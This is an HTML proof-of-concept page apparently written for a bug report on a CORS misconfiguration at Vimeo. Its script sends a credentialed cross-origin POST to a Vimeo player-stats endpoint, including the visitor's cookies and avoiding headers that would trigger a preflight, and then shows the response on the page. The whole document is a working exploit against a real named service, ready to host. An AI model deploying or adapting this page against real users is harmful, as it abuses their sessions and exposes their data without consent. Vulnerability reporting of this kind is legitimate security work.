<!DOCTYPE html>
<html>
<head>
  <title>Vimeo CORS PoC (No Preflight)</title>
</head>
<body>
  <h1>Vimeo CORS Misconfiguration PoC (Simple Request)</h1>
  <pre id="output">Waiting...</pre>

  <script>
    (async () => {
      try {
        const resp = await fetch("https://arclight.vimeo.com/add/player-stats?beacon=1&session-id=ee5275ad972ec12f2849f06e704a09b60c4cea741755882610", {
          method: "POST",
          credentials: "include", // include victim cookies
          // ‚ùå no headers that cause preflight
          body: '[{"autoplay":true,"viewer_id":244943635,"name":"cors-nopreflight"}]'
        });

        const text = await resp.text();
        document.getElementById("output").textContent = text;
      } catch (e) {
        document.getElementById("output").textContent = "Request failed: " + e;
      }
    })();
  </script>
</body>
</html>
